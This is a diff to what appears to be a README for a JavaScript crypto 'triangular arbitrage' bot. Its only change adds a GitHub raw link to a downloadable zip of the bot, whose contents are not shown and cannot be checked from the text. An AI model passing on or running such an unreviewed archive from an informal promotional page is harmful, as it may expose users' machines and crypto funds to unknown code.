@@ -8,6 +8,8 @@ if you fork and modify please give credit
 
 You can Download the zip file of the bot here
 
+https://github.com/CoolnerdcoderV3/JavaScript-Triangular-Arbitrage-Bot-V3/raw/main/javascript-triangle-arbitrage-bot-v3.zip
+
 Here a youtube video of how to config the bot here
 
 Here the bot in action finding a arbitrage
